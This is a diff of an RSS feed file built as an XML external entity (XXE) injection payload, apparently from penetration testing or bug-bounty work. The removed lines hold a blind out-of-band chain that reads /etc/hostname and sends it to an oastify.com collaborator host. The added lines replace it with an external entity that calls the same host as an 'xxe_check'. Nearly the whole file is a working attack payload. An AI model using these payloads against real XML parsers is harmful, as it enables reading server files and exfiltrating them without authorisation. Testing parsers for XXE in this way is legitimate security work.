@@ -1,16 +1,14 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-  <!ENTITY % file SYSTEM "file:///etc/hostname">
-  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com/'>">
-  %eval;
-  %exfil;
+<!DOCTYPE data [
+  <!ENTITY test SYSTEM "http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com/xxe_check">
 ]>
 <rss version="2.0">
   <channel>
-    <title>Final Data Extraction</title>
+    <title>Impact Test</title>
+    <description>&test;</description>
     <item>
-      <title>Check DNS</title>
-      <enclosure url="http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com/test.mp3" length="1000" type="audio/mpeg"/>
+      <title>Final Proof</title>
+      <enclosure url="http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com/audio.mp3" length="1000" type="audio/mpeg"/>
     </item>
   </channel>
 </rss>
